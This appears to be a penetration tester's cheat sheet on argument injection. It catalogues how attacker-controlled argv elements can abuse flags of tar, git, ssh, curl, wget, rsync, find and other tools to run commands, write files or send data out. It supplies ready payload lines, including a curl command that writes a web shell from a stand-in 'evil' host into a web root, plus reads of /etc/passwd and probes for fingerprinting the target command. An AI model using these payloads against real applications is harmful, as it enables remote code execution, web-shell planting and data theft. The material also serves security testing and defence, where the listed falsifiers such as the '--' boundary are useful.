# Argument Injection — exec via the fixed command's own flags

## The critical insight — no shell needed

When input lands as an **argv element** (`execFile('tar',[x])`,
`subprocess.run(['curl',x])`), metacharacters are dead — but **flags are
still free**. A flag is just a string starting `-`; many tools have flags
that execute commands or write files. This survives `escapeshellcmd`,
`execFile`, even alnum+`-` whitelists.

## The flag-to-exec catalogue

| Tool | Flag | Effect |
|---|---|---|
| `tar` | `--checkpoint-action=exec=cmd` | runs cmd at checkpoint |
| `tar` | `--checkpoint=1 --checkpoint-action=exec=sh` | combined |
| `tar` | `-T file` / `--files-from` | read file list (path control) |
| `find` | `-exec cmd {} \;` | runs cmd per match |
| `find` | `-execdir`, `-ok` | variants |
| `curl` | `-o file` / `-o -` | write output to path — file write! |
| `curl` | `-K file` | config file with more opts |
| `curl` | `-F name=@file` | upload local file — exfil |
| `curl` | `-d @file` | post file contents — exfil |
| `wget` | `-O file` | write output — file write |
| `wget` | `--post-file=file` | exfil via post body |
| `wget` | `--config=file` / `-c` | config injection |
| `git` | `--exec=cmd` on `git fetch`/`pull` | runs cmd |
| `git` | `-c alias.x=cmd` then `git x`? | config-defined alias → shell |
| `git` | `--upload-pack=cmd` on clone | runs cmd at fetch |
| `git` | `--config core.sshCommand=cmd` | ssh cmd exec |
| `ssh` | `-oProxyCommand=cmd` | runs cmd as proxy |
| `ssh` | `-o PermitLocalCommand=yes -o LocalCommand=cmd` | local exec |
| `rsync` | `-e cmd` | use cmd as remote shell — runs it |
| `exiftool` | `-config file` | perl config file — code exec |
| `ffmpeg` | `-filter_complex_script`/`graph` | script injection |
| `convert`/`magick` | `-set option:...`/`@file` | coder directives (`imagemagick`) |
| `nmap` | `--script=file` | runs a lua script |
| `zip` | `-TT cmd` (test cmd) / `--unzip-command` | runs cmd |
| `unzip` | `-d dir` traversal only | path write |
| `awk` | `awk 'BEGIN{system("cmd")}'` | if pattern is injected |
| `sed` | `sed -e 'cmd'` `e` command | `sed 's/x/e id/e'` exec |
| `tar` | `--use-compress-program=cmd` | runs cmd as compressor |
| `xargs` | `-P`/`-I` combined | parallel exec of stdin words |
| `env` | `env cmd` | env vars + exec |
| `perl` | `-e code` | inline perl |
| `python` | `-c code` | inline python |
| `node` | `-e code` / `-p` | inline js |
| `php` | `-r code` | inline php |
| `ruby` | `-e code` | inline ruby |
| `man`/`less`/`vi` | `!cmd` inside pager | interactive-only usually |
| `ls` | `--help` info leak only | limited |
| `id`/`ping`/`dig` | few exec flags | mostly harmless — their flags are the limit |
| `grep` | `--include`/`-r` | read-anywhere primitives |
| `openssl` | `-engine`/`-in`/`-out` | file read/write, plugin load |
| `psql`/`mysql` | `-c`/`-e` | SQL injection into DB |
| `msmtp`/`mail` | `-C file`/`-a` | config file exec |
| `cp`/`mv` | `--no-target-directory`/`--strip-trailing-slashes` | path games |
| `chmod`/`chown` | `--reference=file` | file perms manipulation |
| `php` | `--define`/`--auto-prepend` | ini overrides → prepend file |
| `bash`/`sh` | `-c` arg | if the shell IS the fixed command |

## The `--` end-of-options boundary — and how to get past it

`cmd -- INPUT` — `--` ends flag parsing; the input can't be a flag —
**unless** the tool lacks `--` or ignores it:

- `tar`/`curl`/`wget`/`git` honor `--`
- many scripts don't add `--` at all — the arg just gets `-` flag parsed

If the app puts `--` before your input, flag injection is dead — that IS
the falsifier for this vector.

## The `-` first-char test — the argv-boundary probe

```
input: --help        → help text in output? → argv position reached
input: --version     → version banner?
input: -v            → verbose output?
input: --nonexistent → "unrecognized option" error naming the tool?
```

The `unrecognized option` error **names the tool** — free fingerprint.

## `tar --checkpoint-action` — the classic

```
file='--checkpoint=1'
file2='--checkpoint-action=exec=sh shell.sh'
```

Two argv elements needed for `tar`: `--checkpoint=1` AND
`--checkpoint-action=exec=...` — if only one input element exists, the
one-arg form: `--checkpoint-action=exec=sh` still needs `--checkpoint`
— actually `--checkpoint-action` alone with default checkpoint=10 works
if archive has >10 blocks. `tar --checkpoint-action=exec=id` on a
sufficiently-sized archive runs `id` at block 10.

## `curl -o` / `wget -O` — the write-anywhere

```
url='http://x' plus extra arg slot:
curl -o /var/www/html/x.php http://evil/shell   — if url arg separate
```

If you control a SECOND argv or the url field gets split —
`curl $URL -o $path` with $path injectable → write anywhere.

## `find -exec` — execution per-match

```
find /dir -exec sh -c 'id' {} \;
```

`-exec ... \;` — the `\;` terminator must reach argv literally — in argv
mode inject `;`? no — `-exec cmd ;` in argv mode, `;` is a literal arg
(works). In shell-string mode `\;` or `';'`.

## `git` exec flags — the richest modern surface

```
git fetch --upload-pack='id'      — runs as remote helper
git -c core.sshCommand='id' fetch — ssh cmd
git clone -u 'id' url             — -u = upload-pack
git -c alias.x='!id' x            — alias shell escape (needs two args)
```

`--upload-pack`/`-u`/`-c core.sshCommand` all exec.

## `ssh -oProxyCommand` — classic

```
ssh -oProxyCommand='id' x        — cmd runs locally
ssh -o PermitLocalCommand=yes -o LocalCommand='id' x
```

## `rsync -e` — remote-shell flag

```
rsync -e 'sh -c id' x            — -e sets the remote shell program
```

## awk/sed/tar payload-forms for arg slots

If only ONE arg position is controllable:

| Fixed cmd | One-arg payload |
|---|---|
| `awk -f $f` | a file with `BEGIN{system("id")}` (file-write needed) |
| `sed -f $f` | sed script with `e` command |
| `nmap -iL $f` | `-iL` reads hosts; `--script` needs own arg |
| `find $p` | `-exec` needs MANY args — only if args are space-split |
| `curl $u` | `file:///etc/passwd` — scheme read, no exec |
| `dig $h` | `x ANY` or `@server`/`+short` — limited |
| `ping $h` | `-p hexpattern` — payload bytes in reply |
| `wget $u` | `file:///etc/passwd` |
| `tar cf - $f` | `-T` files-from for read |

## argv-splitting injection — when space IS allowed inside an arg

If the app builds `"cmd $a $b"` where you control a multi-word arg —
the single arg with a space inside becomes two argv elements at the
shell's word-splitting step — this is really shell-boundary again. True
argv-mode tools don't re-split.

## Falsifiers — the class actually closes here

- the input is a clean argv element AND the fixed command takes no
  exec/write/read-capable flag for your position AND `--` precedes it
- `cmd "$INPUT"` where INPUT positionally follows `--` = dead

## Output to record

- the fixed command fingerprinted + which flag in the argv position it
  honors + the flag payload form
